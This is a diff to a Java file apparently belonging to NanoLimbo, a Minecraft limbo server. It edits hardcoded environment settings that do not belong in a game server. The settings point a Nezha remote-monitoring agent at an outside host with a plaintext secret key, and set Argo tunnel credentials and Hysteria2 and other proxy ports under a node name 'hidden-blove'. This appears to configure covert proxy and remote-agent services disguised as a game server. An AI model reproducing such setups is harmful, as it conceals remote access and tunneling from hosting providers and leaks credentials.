@@ -123,16 +123,16 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "38a94037-5d07-4281-b850-57ff879d7005");
+        envVars.put("UUID", "6110623e-8702-494d-ad5d-8185e2fba23f");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "agent.ejoy.pp.ua:80");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "8LbSFqkeuoEdFW1bRCuqggK3a5WddR5Z");
         envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "discloud-blove.efast.qzz.io");
-        envVars.put("ARGO_AUTH", "eyJhIjoiZDJmNmY4YmYwYzhlZjkyNDg4MmIxNjEyODYwODQ4ODciLCJ0IjoiM2VkNDE1YTgtNjE0OS00ZmYxLTlmMTAtNDU4ZjM5Y2I4YmMzIiwicyI6Ik5tRm1OVGRpWVdJdE9EWTNaaTAwTlRWbExUazFaVFl0TnpVNVl6RmlOREl4WVRJeSJ9");
+        envVars.put("ARGO_DOMAIN", "");
+        envVars.put("ARGO_AUTH", "");
         envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "20789");
+        envVars.put("HY2_PORT", "24660");
         envVars.put("TUIC_PORT", "");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("REALITY_PORT", "");
@@ -142,7 +142,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "lemehost-3");
+        envVars.put("NAME", "hidden-blove");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
